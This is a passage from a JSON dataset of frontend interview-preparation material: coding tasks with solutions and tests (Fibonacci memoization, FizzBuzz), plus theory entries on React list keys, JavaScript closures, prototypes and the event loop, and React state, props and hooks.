            "Configuration",
            "Loaders",
            "Development Setup"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_webpack_fundamentals",
            "Node.js",
            "npm/yarn",
            "Basic SCSS",
            "Basic TypeScript"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Webpack Loaders",
            "Webpack Plugins",
            "Transpilation",
            "Module Resolution"
          ]
        },
        {
          "id": "task_fibonacci_memoization",
          "title": "Implement Fibonacci with Memoization (Dynamic Programming - Top-Down)",
          "description": "\nImplement a function `fibonacciMemoized(n)` that calculates the nth Fibonacci number using memoization (a top-down dynamic programming approach). This should combine the clarity of the recursive approach with the efficiency of caching previously computed results.\n\n**Requirements:**\n1.  The function should handle base cases `F(0) = 0` and `F(1) = 1`.\n2.  It must use a cache (e.g., an object or `Map`) to store results of subproblems.\n3.  Before computing `F(k)`, check if `F(k)` is already in the cache. If yes, return the cached value.\n4.  If not, compute `F(k)`, store it in the cache, and then return it.\n5.  Analyze its time and space complexity.\n",
          "difficulty": "medium",
          "startingCode": "function fibonacciMemoized(n) {\n  const memo = {}; // Cache to store computed Fibonacci numbers\n\n  // TODO: Implement the recursive logic with memoization\n  // Base cases:\n  // F(0) = 0\n  // F(1) = 1\n\n  // Check memo before computing\n  // Compute and store in memo if not present\n\n  return -1; // Placeholder\n}\n\n// Example usage:\n// console.log(fibonacciMemoized(10)); // Should be 55\n// console.log(fibonacciMemoized(40)); // Should be fast\n",
          "solutionCode": "function fibonacciMemoized(n) {\n  const memo = {}; // Cache to store computed Fibonacci numbers\n\n  function fib(num) {\n    if (num in memo) { // Check if result is already in cache\n      return memo[num];\n    }\n    \n    if (num < 2) { // Base cases\n      return num;\n    }\n    \n    // Compute, store in cache, and return\n    memo[num] = fib(num - 1) + fib(num - 2);\n    return memo[num];\n  }\n\n  return fib(n);\n}\n\n/*\nAnalysis:\nTime Complexity: O(n)\nEach Fibonacci number from 0 to n is computed only once. Although it's recursive, the memoization ensures that for each 'num', the 'fib' function is called exactly once to compute its value and store it. Subsequent calls retrieve the value directly from the memo.\n\nSpace Complexity: O(n)\nThis is due to two factors:\n1. The 'memo' object stores up to 'n' key-value pairs.\n2. The recursion call stack can go up to 'n' levels deep in the worst case (e.g., for fib(n), it will call fib(n-1), then fib(n-2) etc. until fib(1) or fib(0) is hit on one branch, before returning and exploring the other branch).\n*/\n\n// Test Cases\n// console.log(fibonacciMemoized(0));   // Expected: 0\n// console.log(fibonacciMemoized(1));   // Expected: 1\n// console.log(fibonacciMemoized(2));   // Expected: 1\n// console.log(fibonacciMemoized(3));   // Expected: 2\n// console.log(fibonacciMemoized(10));  // Expected: 55\n// console.log(fibonacciMemoized(40));  // Expected: 102334155 (should be very fast, unlike naive recursive)\n// console.log(fibonacciMemoized(50));  // Expected: 12586269025\n",
          "testCases": [
            "Test with F(0): `fibonacciMemoized(0)` should return `0`.",
            "Test with F(1): `fibonacciMemoized(1)` should return `1`.",
            "Test with F(5): `fibonacciMemoized(5)` should return `5`.",
            "Test with F(10): `fibonacciMemoized(10)` should return `55`.",
            "Test with a large number like F(40) to ensure performance: `fibonacciMemoized(40)` should compute quickly and return `102334155`.",
            "Verify `memo` is being used (e.g., by logging `memo` or by stepping through with a debugger to see if `fib` is called for previously computed values)."
          ],
          "hints": [
            "Define an inner helper function that takes `num` and the `memo` object as arguments (or a closure capturing `memo`).",
            "The base cases for Fibonacci are `F(0)=0` and `F(1)=1`.",
            "Before making recursive calls, always check if the result for the current `num` is already in your `memo` object.",
            "If the result is not in `memo`, compute it, store it, and then return it.",
            "Consider the difference in time complexity between this and the naive recursive approach. What is it now?"
          ],
          "tags": [
            "Algorithm",
            "Dynamic Programming",
            "Memoization",
            "Recursion",
            "Fibonacci",
            "Optimization",
            "Time Complexity",
            "Space Complexity"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_fibonacci_sequence",
            "Recursion",
            "JavaScript Objects/Maps"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Dynamic Programming",
            "Top-Down Approach",
            "Caching"
          ]
        },
        {
          "id": "task_fizzbuzz_return_array",
          "title": "Implement FizzBuzz Returning an Array",
          "description": "\nImplement a function `getFizzBuzzResults(start, end)` that generates the FizzBuzz sequence for a given range (`start` to `end`, inclusive). Instead of logging the output to the console, the function should return an array of strings containing the results.\n\n**Requirements:**\n1.  The function should accept two integer arguments: `start` and `end`.\n2.  It should iterate from `start` to `end` (inclusive).\n3.  For each number, apply the standard FizzBuzz rules:\n    *   Divisible by 3 and 5: 'FizzBuzz'\n    *   Divisible by 3: 'Fizz'\n    *   Divisible by 5: 'Buzz'\n    *   Otherwise: the number itself (as a string).\n4.  Return an array containing all generated strings.\n5.  Handle edge cases where `start` > `end` or `start`/`end` are non-positive.\n",
          "difficulty": "easy",
          "startingCode": "function getFizzBuzzResults(start, end) {\n  const results = [];\n  \n  // TODO: Implement loop from start to end\n  // TODO: Apply FizzBuzz logic for each number\n  // TODO: Add results to the 'results' array\n\n  return results; // Return the accumulated results\n}\n\n// Example usage:\n// console.log(getFizzBuzzResults(1, 15));\n/* Expected Output for 1 to 15:\n[\n  '1', '2', 'Fizz', '4', 'Buzz',\n  'Fizz', '7', '8', 'Fizz', 'Buzz',\n  '11', 'Fizz', '13', '14', 'FizzBuzz'\n]\n*/\n",
          "solutionCode": "function getFizzBuzzResults(start, end) {\n  const results = [];\n\n  // Handle edge case: if start > end or invalid range, return empty array\n  if (start > end || typeof start !== 'number' || typeof end !== 'number' || !Number.isInteger(start) || !Number.isInteger(end)) {\n    return [];\n  }\n\n  for (let i = start; i <= end; i++) {\n    if (i % 3 === 0 && i % 5 === 0) {\n      results.push('FizzBuzz');\n    } else if (i % 3 === 0) {\n      results.push('Fizz');\n    } else if (i % 5 === 0) {\n      results.push('Buzz');\n    } else {\n      results.push(String(i)); // Ensure numbers are stored as strings\n    }\n  }\n\n  return results;\n}\n\n// Test Cases\n// console.log(getFizzBuzzResults(1, 15));\n// /* Expected Output for 1 to 15:\n// [\n//   '1', '2', 'Fizz', '4', 'Buzz',\n//   'Fizz', '7', '8', 'Fizz', 'Buzz',\n//   '11', 'Fizz', '13', '14', 'FizzBuzz'\n// ]\n// */\n// console.log(getFizzBuzzResults(10, 20));\n// /* Expected:\n// [ 'Buzz', '11', 'Fizz', '13', '14', 'FizzBuzz', '16', '17', 'Fizz', '19', 'Buzz' ]\n// */\n// console.log(getFizzBuzzResults(-5, 5));\n// /* Expected:\n// [ 'Buzz', '-4', 'Fizz', '-2', '-1', 'FizzBuzz', '1', '2', 'Fizz', '4', 'Buzz' ]\n// */\n// console.log(getFizzBuzzResults(5, 1)); // Expected: []\n// console.log(getFizzBuzzResults(0, 0)); // Expected: ['FizzBuzz']\n",
          "testCases": [
            "Test with standard range: `getFizzBuzzResults(1, 15)` should return the correct array of 15 elements, ending with 'FizzBuzz'.",
            "Test with a different range: `getFizzBuzzResults(10, 20)` should correctly produce the sequence for that range.",
            "Test with `start` > `end`: `getFizzBuzzResults(5, 1)` should return an empty array `[]`.",
            "Test with non-positive numbers: `getFizzBuzzResults(-5, 5)` should handle negative and zero values correctly (e.g., 0 % 3 === 0 and 0 % 5 === 0, so 'FizzBuzz').",
            "Test with single number range: `getFizzBuzzResults(7, 7)` should return `['7']`.",
            "Test with `start = end = 0`: `getFizzBuzzResults(0, 0)` should return `['FizzBuzz']`."
          ],
          "hints": [
            "Remember to convert numbers to strings before pushing them into the results array (`String(i)` or `${i}`).",
            "Pay attention to the order of conditional checks (`i % 3 === 0 && i % 5 === 0` should come first).",
            "Consider input validation for `start` and `end` to ensure they are valid numbers and `start` is not greater than `end`."
          ],
          "tags": [
            "Algorithm",
            "FizzBuzz",
            "Array Manipulation",
            "Loops",
            "Conditionals",
            "Edge Cases"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "theory_fizzbuzz_problem",
            "Arrays",
            "Loops",
            "Conditionals"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "relatedConcepts": [
            "Function Parameters",
            "Return Values"
          ]
        }
      ]
    }
  },
  {
    "id": "a581fd75-a75e-478e-b491-c01cc45db54d",
    "startLine": 13400,
    "endLine": 13499,
    "processedDate": "2025-06-17T13:26:47.814Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_react_key_best_practices",
          "title": "React Best Practices: Avoiding Index as Key",
          "content": "Using the `key` prop in React lists is crucial for performance and correctness. When rendering lists of components, React uses `keys` to identify which items have changed, are added, or are removed. This helps React efficiently update the UI during reconciliation.\n\n## The Problem with Using Index as Key\nUsing an array's index as a `key` (`key={index}`) is a common anti-pattern, especially when list items can be reordered, added, or removed. React uses keys to maintain the identity of components. If an item's position changes but its `key` (which is its index) remains the same as another item that was previously at that position, React might reuse the component instance instead of re-rendering it or moving it. This can lead to:\n\n1.  **Component State Mix-ups:** If a list item has internal state (e.g., an input field's value, a checkbox's checked state), that state might persist with the wrong item when the list is reordered, as React thinks it's the same component just at a new index.\n2.  **Unnecessary Re-renders and Performance Issues:** When items are inserted or removed in the middle of a list, all subsequent items will have their indices shifted. React will perceive these as new components at those new indices, leading to unnecessary re-mounting and re-rendering of many components instead of just the changed ones.\n3.  **Subtle UI Bugs:** These issues are often hard to track down because the UI might appear correct initially, but unexpected behavior emerges after list modifications.\n\n## Good Practice: Using Unique, Stable Identifiers\nAlways use a unique and stable identifier for each item in a list as its `key` prop. This identifier should be intrinsic to the data itself and remain consistent across re-renders and reordering.\n\n### When is `index` acceptable?\nUsing `index` as a `key` is generally discouraged. However, it *can* be acceptable in very specific scenarios where:\n1.  The list and its items are static and will **never** change (no additions, deletions, or reordering).\n2.  The items in the list have no unique IDs.\n3.  The list is never filtered or reordered.\n\nIn most real-world applications, these conditions are rarely met, making it safer to always use unique IDs.",
          "examples": [
            {
              "id": "example_key_bad_practice",
              "title": "Bad Practice: Using Index as Key",
              "code": "function ItemList({ items }) {\n  return (\n    <ul>\n      {items.map((item, index) => (\n        // BAD: Using index as key can lead to bugs and performance issues\n        <ListItem key={index} item={item} />\n      ))}\n    </ul>\n  );\n}\n\nfunction ListItem({ item }) {\n  // Imagine ListItem has internal state, e.g., an input field\n  return <li>{item.name}</li>;\n}",
              "explanation": "This example demonstrates the incorrect use of `index` as a key. If `items` array is reordered, React might not correctly update the DOM elements, leading to state persistence issues or incorrect rendering of list items.",
              "language": "typescript"
            },
            {
              "id": "example_key_good_practice",
              "title": "Good Practice: Using Unique ID as Key",
              "code": "function ItemList({ items }) {\n  return (\n    <ul>\n      {items.map(item => (\n        // GOOD: Using a stable, unique ID ensures correct component identity\n        <ListItem key={item.id} item={item} />\n      ))}\n    </ul>\n  );\n}\n\nfunction ListItem({ item }) {\n  // Imagine ListItem has internal state, e.g., an input field\n  return <li>{item.name}</li>;\n}",
              "explanation": "This example shows the recommended approach: using a unique, stable identifier (`item.id`) from the data as the key. This allows React to efficiently and correctly reconcile the list when items are added, removed, or reordered.",
              "language": "typescript"
            }
          ],
          "relatedQuestions": [
            "question_react_key_purpose",
            "question_react_key_index_issue",
            "question_react_key_best_practice_mcq",
            "question_react_key_consequences_open"
          ],
          "relatedTasks": [
            "task_react_refactor_list_keys"
          ],
          "tags": [
            "React",
            "Performance",
            "Best Practices",
            "Lists",
            "Keys"
          ],
          "technology": "React",
          "prerequisites": [
            "React_Components",
            "JavaScript_Array_Methods"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "React_Performance_Optimization",
            "Complex_List_Rendering"
          ]
        },
        {
          "id": "theory_javascript_fundamentals",
          "title": "JavaScript Fundamentals: Core Concepts",
          "content": "This section covers essential JavaScript concepts frequently tested in frontend interviews, focusing on how JavaScript handles events, comparisons, scope, inheritance, and asynchronous operations.\n\n## Event Delegation\nEvent delegation is a technique where you attach a single event listener to a parent element, rather than attaching separate listeners to each individual child element. When an event occurs on a child element, it 'bubbles up' (propagates) through the DOM tree to its parent elements. The single listener on the parent can then detect the event, identify the original target element (using `event.target`), and perform the appropriate action.\n\n### Benefits:\n*   **Performance:** Reduces memory consumption by minimizing the number of event listeners.\n*   **Dynamic Elements:** Automatically handles events for elements added to the DOM dynamically after the initial render.\n*   **Cleaner Code:** Centralizes event handling logic.\n\n## Comparison Operators: `==` vs `===`\nJavaScript provides two primary equality operators:\n\n*   **Loose Equality (`==`)**: Compares two values for equality after performing **type coercion**. If the operands are of different types, JavaScript attempts to convert one or both operands to a common type before comparison.\n    *   Example: `0 == '0'` evaluates to `true` because JavaScript converts `'0'` to the number `0`.\n    *   Example: `null == undefined` evaluates to `true`.\n\n*   **Strict Equality (`===`)**: Compares two values for equality **without** type coercion. It returns `true` only if both the value and the type of the operands are identical.\n    *   Example: `0 === '0'` evaluates to `false` because their types (number vs. string) are different.\n    *   Example: `null === undefined` evaluates to `false`.\n\n**Best Practice:** It is generally recommended to use `===` to avoid unexpected behavior due to type coercion, leading to more predictable and robust code.\n\n## Closures\nA closure is a function that remembers its outer lexical environment even after the outer function has finished executing. This means a closure has access to variables from its parent scope (the scope in which it was declared), even if the parent function has already returned.\n\n### Key Characteristics:\n*   **Lexical Scoping:** Closures are created when a function is defined within another function.\n*   **Data Privacy:** They allow for creating private variables and functions.\n*   **Stateful Functions:** They can maintain state across multiple calls.\n\n## Prototype Inheritance\nJavaScript is a prototype-based language, meaning objects can inherit properties and methods directly from other objects. Every JavaScript object has an internal `[[Prototype]]` property, which points to another object (its prototype). When you try to access a property or method on an object, JavaScript first looks on the object itself. If it's not found, it then looks on the object's prototype, and so on up the **prototype chain**, until it finds the property or reaches the end of the chain (which is `null`).\n\n### Key Concepts:\n*   `Object.prototype`: The base of all objects, containing fundamental methods like `toString()`, `hasOwnProperty()`, etc.\n*   `__proto__` (deprecated, but common for understanding): An accessor property on instances that exposes the internal `[[Prototype]]` link.\n*   `Object.getPrototypeOf()`: The standard way to get an object's prototype.\n*   Constructor Functions: Used with the `new` keyword to create objects that inherit from the constructor's `prototype` property.\n\n## The Event Loop\nJavaScript is single-threaded, meaning it can execute only one operation at a time. However, it can perform non-blocking operations (like fetching data, timers) due to the **Event Loop**. The Event Loop is a fundamental concurrency model that enables JavaScript to handle asynchronous callbacks.\n\n### Components of the Event Loop:\n1.  **Call Stack (Execution Stack):** Where synchronous code is executed. Functions are pushed onto the stack when called and popped off when they return.\n2.  **Web APIs (Browser APIs / Node.js APIs):** Provided by the browser or Node.js runtime, not JavaScript itself. These APIs handle asynchronous tasks (e.g., `setTimeout`, `fetch`, DOM events). When an async operation starts, it's offloaded to a Web API, allowing the Call Stack to continue executing other code.\n3.  **Callback Queue (Task Queue / Macrotask Queue):** After an asynchronous operation (e.g., `setTimeout` delay expires, `fetch` response arrives, DOM event fires) completes in a Web API, its associated callback function is moved to the Callback Queue.\n4.  **Microtask Queue:** A higher-priority queue than the Callback Queue. It holds callbacks for Promises (`.then()`, `.catch()`, `.finally()`) and `queueMicrotask`. Microtasks are processed *before* macrotasks (callbacks from the Callback Queue) after the Call Stack is empty.\n5.  **Event Loop:** Continuously monitors the Call Stack and the queues. When the Call Stack is empty, it checks the Microtask Queue first. If it's not empty, it moves all microtasks from the Microtask Queue to the Call Stack to be executed. Once the Microtask Queue is empty, it then checks the Callback Queue. If the Callback Queue is not empty, it takes the first callback from the Callback Queue and pushes it onto the Call Stack for execution. This process repeats indefinitely.\n\nThis mechanism allows JavaScript to appear non-blocking by deferring asynchronous operations and handling their results efficiently without halting the main thread.",
          "examples": [
            {
              "id": "example_event_delegation",
              "title": "Event Delegation Example",
              "code": "// HTML structure:\n// <ul id=\"myList\">\n//   <li>Item 1</li>\n//   <li>Item 2</li>\n//   <li>Item 3</li>\n// </ul>\n\nconst list = document.getElementById('myList');\nlist.addEventListener('click', function(event) {\n  if (event.target.tagName === 'LI') {\n    console.log('Clicked on:', event.target.textContent);\n  }\n});\n\n// Dynamically add a new item\nconst newItem = document.createElement('li');\nnewItem.textContent = 'Item 4';\nlist.appendChild(newItem);\n// Clicking 'Item 4' will still be handled by the parent listener.",
              "explanation": "This example shows event delegation. Instead of adding a click listener to each `<li>`, a single listener is attached to the `<ul>`. When an `<li>` is clicked, the event bubbles up to the `<ul>`, and `event.target` identifies the specific `<li>` that was clicked, allowing for efficient and dynamic event handling.",
              "language": "javascript"
            },
            {
              "id": "example_comparison_operators",
              "title": "Comparison Operators: == vs ===",
              "code": "console.log(0 == \"0\");    // true (type coercion: string \"0\" becomes number 0)\nconsole.log(0 === \"0\");   // false (different types: number vs string)\n\nconsole.log(1 == true);   // true (type coercion: boolean true becomes number 1)\nconsole.log(1 === true);  // false (different types: number vs boolean)\n\nconsole.log(null == undefined); // true (special rule for these two)\nconsole.log(null === undefined); // false (different types)\n\nconsole.log(\"2\" == 2);   // true\nconsole.log(\"2\" === 2);  // false",
              "explanation": "This example clearly illustrates the difference between loose (`==`) and strict (`===`) equality. Loose equality performs type coercion, which can lead to unexpected results, whereas strict equality requires both value and type to be identical, making it generally safer and more predictable.",
              "language": "javascript"
            },
            {
              "id": "example_closures",
              "title": "Closure Example: Counter Function",
              "code": "function createCounter() {\n  let count = 0; // 'count' is in the outer function's scope\n\n  return function() { // This inner function is a closure\n    return ++count; // It has access to 'count'\n  };\n}\n\nconst counter1 = createCounter();\nconsole.log(counter1()); // 1 (count for counter1 is 1)\nconsole.log(counter1()); // 2 (count for counter1 is 2)\n\nconst counter2 = createCounter(); // Creates a new independent closure\nconsole.log(counter2()); // 1 (count for counter2 is 1)\nconsole.log(counter1()); // 3 (count for counter1 continues from where it left off)",
              "explanation": "The `createCounter` function returns an inner (anonymous) function. This inner function 'closes over' the `count` variable from its outer scope. Even after `createCounter` has finished executing, the inner function retains access to `count`, allowing it to increment and return its value on subsequent calls. Each call to `createCounter` creates a new, independent closure and `count` variable.",
              "language": "javascript"
            },
            {
              "id": "example_prototype_inheritance",
              "title": "Prototype Inheritance Example",
              "code": "// Constructor function\nfunction Person(name) {\n  this.name = name;\n}\n\n// Add a method to the Person's prototype\nPerson.prototype.greet = function() {\n  console.log(`Hello, my name is ${this.name}`);\n};\n\nconst john = new Person('John');\njohn.greet(); // John inherits greet() from Person.prototype\n\nconsole.log(john.__proto__ === Person.prototype); // true\nconsole.log(Object.getPrototypeOf(john) === Person.prototype); // true\n\n// Another object inheriting from Person.prototype\nconst jane = new Person('Jane');\njane.greet();\n\n// Properties/methods not found on the instance are looked up on the prototype chain\nconsole.log(john.hasOwnProperty('name')); // true (name is directly on john)\nconsole.log(john.hasOwnProperty('greet')); // false (greet is on the prototype)\n",
              "explanation": "This example demonstrates how `Person` objects `john` and `jane` inherit the `greet` method from `Person.prototype`. When `john.greet()` is called, JavaScript first looks for `greet` on the `john` object itself. Since it's not found, it then looks up the prototype chain to `Person.prototype`, where it finds `greet` and executes it. This mechanism allows for efficient sharing of methods and properties among instances.",
              "language": "javascript"
            },
            {
              "id": "example_event_loop",
              "title": "Event Loop Execution Order Example",
              "code": "console.log('Start'); // 1. Synchronous code\n\nsetTimeout(() => { // 2. Macrotask (Callback Queue)\n  console.log('Timeout 1');\n}, 0);\n\nPromise.resolve().then(() => { // 3. Microtask (Microtask Queue)\n  console.log('Promise 1');\n});\n\nsetTimeout(() => { // 4. Macrotask (Callback Queue)\n  console.log('Timeout 2');\n}, 0);\n\nPromise.resolve().then(() => { // 5. Microtask (Microtask Queue)\n  console.log('Promise 2');\n});\n\nconsole.log('End'); // 6. Synchronous code\n\n// Expected Output:\n// Start\n// End\n// Promise 1\n// Promise 2\n// Timeout 1\n// Timeout 2",
              "explanation": "This example illustrates the Event Loop's execution order. All synchronous code (`Start`, `End`) runs first. Then, the Event Loop prioritizes the Microtask Queue over the Macrotask Queue. So, all Promise callbacks (`Promise 1`, `Promise 2`) execute before any `setTimeout` callbacks (`Timeout 1`, `Timeout 2`), even if `setTimeout` has a 0ms delay. This demonstrates the non-blocking nature and the asynchronous processing order facilitated by the event loop.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_js_event_delegation_explanation",
            "question_js_double_triple_equals_mcq",
            "question_js_closure_definition",
            "question_js_prototype_inheritance_open",
            "question_js_event_loop_flow",
            "question_js_event_loop_mcq",
            "question_js_closure_use_case_code",
            "question_js_event_delegation_benefits_open"
          ],
          "relatedTasks": [
            "task_event_delegation_list",
            "task_closure_private_counter",
            "task_event_loop_prediction"
          ],
          "tags": [
            "JavaScript",
            "Fundamentals",
            "Event Loop",
            "Closures",
            "Prototypes",
            "Equality",
            "Event Delegation"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript_Basics",
            "Functions",
            "Objects"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Asynchronous_JavaScript",
            "Object_Oriented_JavaScript",
            "Advanced_DOM_Manipulation"
          ]
        },
        {
          "id": "theory_react_fundamentals",
          "title": "React Fundamentals: Core Concepts",
          "content": "This section delves into the foundational concepts of React, covering its core mechanisms for UI rendering, component communication, state management, and lifecycle management.\n\n## Virtual DOM\nReact introduces the concept of the **Virtual DOM (VDOM)**, which is a lightweight, in-memory representation of the actual DOM. When component state changes, React first updates this virtual DOM. It then compares the current virtual DOM with the previous one (a process called 'diffing'). Based on this comparison, React calculates the minimal set of changes needed to update the real DOM. This process, known as **Reconciliation**, then applies only those necessary changes to the actual DOM.\n\n### Benefits:\n*   **Performance Optimization:** Directly manipulating the actual DOM is a costly operation. By minimizing direct DOM operations, React significantly improves performance.\n*   **Cross-Platform Compatibility:** The abstraction of the Virtual DOM makes React adaptable to different rendering environments (e.g., web browsers, mobile apps via React Native).\n*   **Simplified UI Development:** Developers work with a declarative API, letting React handle the imperative DOM manipulations.\n\n## State vs. Props\nTwo fundamental concepts for managing data flow in React components:\n\n*   **Props (Properties):**\n    *   **Definition:** Arguments passed into React components from their parent components.\n    *   **Immutability:** Props are read-only. A component should never modify its own props.\n    *   **Data Flow:** Primarily used for communication from parent to child components (`uni-directional data flow`).\n    *   **Usage:** For passing data and callback functions down the component tree.\n\n*   **State:**\n    *   **Definition:** Data managed within a component that can change over time. It represents the mutable part of the component's data.\n    *   **Mutability (Managed):** State can be changed by the component itself using `setState` (for class components) or `useState` (for functional components).\n    *   **Data Flow:** Primarily affects the component that owns it and its child components that receive state via props.\n    *   **Usage:** For data that changes based on user interaction, network responses, or other events within the component.\n\n## React Hooks\n**React Hooks** are functions introduced in React 16.8 that let you use state and other React features (like lifecycle methods, context) in functional components without writing class components. They aim to simplify component logic, improve reusability, and solve common issues associated with classes (e.g., `this` binding, prop drilling for lifecycle logic).\n\n### Common Built-in Hooks:\n*   `useState`: For adding state to functional components.\n*   `useEffect`: For performing side effects (data fetching, subscriptions, manual DOM manipulations, timers) in functional components.\n*   `useContext`: For subscribing to React context, avoiding prop drilling.\n*   `useReducer`: An alternative to `useState` for more complex state logic.\n*   `useMemo`: For memoizing (caching) expensive computations, preventing re-computation on every render if dependencies haven't changed.\n*   `useCallback`: For memoizing callback functions, preventing unnecessary re-creation and helping optimize child components that rely on referential equality.\n\n## React's Diffing Algorithm (Reconciliation)\nReact's diffing algorithm is a set of heuristics used during the **Reconciliation** process to efficiently update the actual DOM. When the virtual DOM changes, React needs to figure out the most efficient way to update the real DOM. The algorithm makes two main assumptions:\n\n1.  **Two elements of different types will produce different trees:** If the element type changes (e.g., `<div>` to `<span>`), React will tear down the old tree and build the new one from scratch, destroying the old component instance and its state.\n2.  **The developer can hint at which child elements may be stable across different renders with a `key` prop:** For lists, keys help React identify unique items, allowing it to efficiently reorder, add, or remove elements rather than re-rendering the entire list.\n\n### Reconciliation Process:\n*   **Element Type Comparison:** React first compares the root elements. If types differ, the old component is unmounted, and the new one is mounted. If types are the same, React compares their attributes (props) and updates the real DOM only for changed attributes.\n*   **Recursive Children Comparison:** For elements with children, React recursively processes the children. By default, it iterates over the old list and the new list of children simultaneously. If unique `keys` are provided, React uses them to match children from the old list with children in the new list, enabling efficient moves, additions, and removals.\n\n## Redux\n**Redux** is a predictable state container for JavaScript applications. It's often used with React for managing application-wide state. Redux enforces a strict unidirectional data flow and follows three core principles:\n\n1.  **Single Source of Truth:** The entire application's state is stored in a single plain JavaScript object within one store.\n2.  **State is Read-Only:** The only way to change the state is by emitting an action, an object describing what happened. This ensures changes are explicit and traceable.\n3.  **Changes are Made with Pure Functions (Reducers):** To specify how the state tree is transformed by actions, you write pure functions called reducers. Reducers take the current state and an action, and return a *new* state object, without mutating the original state.\n\n### When to use Redux:\nRedux is beneficial in large, complex applications with:\n*   **Complex Shared State:** State needed by many components, sometimes deeply nested.\n*   **Frequent State Updates:** Many actions modify the state.\n*   **Predictable State Changes:** When you need strict control and debugging capabilities over state modifications.\n*   **Team Collaboration:** Provides a clear pattern for state management across a large codebase.\n\nFor simpler applications, React's built-in `useState` and `useContext` or other lightweight state management solutions might be sufficient.\n\n## `setState()` Synchronicity and Functional Updates\nIn React class components, `setState()` is **asynchronous**. React may batch multiple `setState()` calls into a single update for performance reasons, especially within event handlers or lifecycle methods. This means you cannot rely on `this.state` being immediately updated after calling `setState()`.\n\n### Ensuring Code Runs After State Update:\n1.  **Callback Function:** `setState()` accepts an optional second argument, which is a callback function that will be executed *after* the state update is applied and the component has re-rendered.\n    ```javascript\n    this.setState({ data: [1,2,3] }, () => {\n      console.log('State is now updated', this.state.data);\n    });\n    ```\n\n2.  **`componentDidUpdate` Lifecycle Method:** For logic that always needs to run after a state or prop update, `componentDidUpdate` is suitable. You can compare `prevProps` and `prevState` with current `this.props` and `this.state`.\n\n### Functional `setState()` for Updates Based on Previous State:\nWhen the new state depends on the previous state, you should use the **functional form** of `setState()`. This form receives `prevState` and `props` as arguments, ensuring you are working with the most up-to-date state values, preventing race conditions or stale state issues.\n```javascript\nthis.setState((prevState, props) => {\n  return { count: prevState.count + props.increment };\n});\n```\nThis approach is crucial for reliable state updates, particularly when multiple `setState` calls are batched or when state changes rapidly.",
          "examples": [
            {
              "id": "example_virtual_dom",
              "title": "Virtual DOM Concept",
              "code": "/* \n  Conceptual process: \n  1. Initial Render: \n     const vdom1 = React.render(<App />);\n     ReactDOM.render(vdom1, document.getElementById('root'));\n\n  2. State Update (e.g., click a button):\n     setState({ count: this.state.count + 1 });\n\n  3. Re-render Virtual DOM:\n     const vdom2 = React.render(<App newProps />);\n\n  4. Diffing:\n     React compares vdom1 and vdom2 to find differences.\n     \n  5. Reconciliation (Actual DOM Update):\n     ReactDOM.patch(document.getElementById('root'), diffs); \n     (Only apply the minimal changes to the real DOM)\n*/\n\n// No direct code example as Virtual DOM is an internal mechanism, \n// but this conceptual flow explains its role in a React component's life cycle.\nfunction Counter() {\n  const [count, setCount] = React.useState(0);\n\n  const increment = () => {\n    setCount(count + 1); // This triggers a Virtual DOM update internally\n  };\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={increment}>Increment</button>\n    </div>\n  );\n}",
              "explanation": "This conceptual explanation highlights how the Virtual DOM works: React creates a lightweight representation of the UI, calculates differences efficiently, and then applies only the necessary updates to the actual DOM. The `Counter` component, when its state changes via `setCount`, internally triggers this Virtual DOM process, optimizing render performance.",
              "language": "javascript"
            },
            {
              "id": "example_state_vs_props",
              "title": "State vs. Props Example",
              "code": "function ParentComponent() {\n  // State managed by ParentComponent\n  const [message, setMessage] = React.useState('Hello from Parent!');\n\n  const handleButtonClick = () => {\n    setMessage('Message updated by Parent!');\n  };\n\n  return (\n    <div>\n      <ChildComponent greeting={message} /> {/* message passed as prop */}\n      <button onClick={handleButtonClick}>Update Message</button>\n    </div>\n  );\n}\n\nfunction ChildComponent(props) {\n  // props.greeting is read-only here\n  // props.greeting = 'New value'; // ERROR: Props are immutable\n\n  // State managed internally by ChildComponent\n  const [childClicks, setChildClicks] = React.useState(0);\n\n  const handleChildClick = () => {\n    setChildClicks(childClicks + 1);\n  };\n\n  return (\n    <div>\n      <p>Parent says: {props.greeting}</p>\n      <p>Child has been clicked: {childClicks} times</p>\n      <button onClick={handleChildClick}>Click Child</button>\n    </div>\n  );\n}",
              "explanation": "In this example, `message` is `state` in `ParentComponent` and is passed as a `prop` named `greeting` to `ChildComponent`. `ChildComponent` receives `greeting` as an immutable prop. `ChildComponent` also manages its own internal `state` called `childClicks`, which can be updated independently. This demonstrates the uni-directional flow of props (parent to child) and the local management of state within a component.",
              "language": "javascript"
            },
            {
              "id": "example_react_hooks_useState_useEffect",
              "title": "React Hooks Example: useState and useEffect",
              "code": "import React, { useState, useEffect } from 'react';\n\nfunction Timer() {\n  // useState: add state to functional component\n  const [seconds, setSeconds] = useState(0);\n\n  // useEffect: run side effects after render\n  useEffect(() => {\n    // This function runs once after initial render and on subsequent updates\n    const intervalId = setInterval(() => {\n      setSeconds(prevSeconds => prevSeconds + 1);\n    }, 1000);\n\n    // Cleanup function: runs when component unmounts or before re-running effect\n    return () => clearInterval(intervalId);\n  }, []); // Empty dependency array means effect runs once on mount and cleans up on unmount\n\n  return (\n    <div>\n      <p>Seconds: {seconds}</p>\n    </div>\n  );\n}",
              "explanation": "This `Timer` component uses `useState` to manage its `seconds` state. `useEffect` is used to set up a `setInterval` (a side effect) that updates the `seconds` every second. The cleanup function returned by `useEffect` ensures the interval is cleared when the component unmounts, preventing memory leaks. The empty dependency array `[]` ensures the effect runs only once after the initial render and its cleanup runs only on unmount.",
              "language": "javascript"
            },
            {
              "id": "example_setstate_async_and_functional",
              "title": "setState() Asynchronous & Functional Updates",
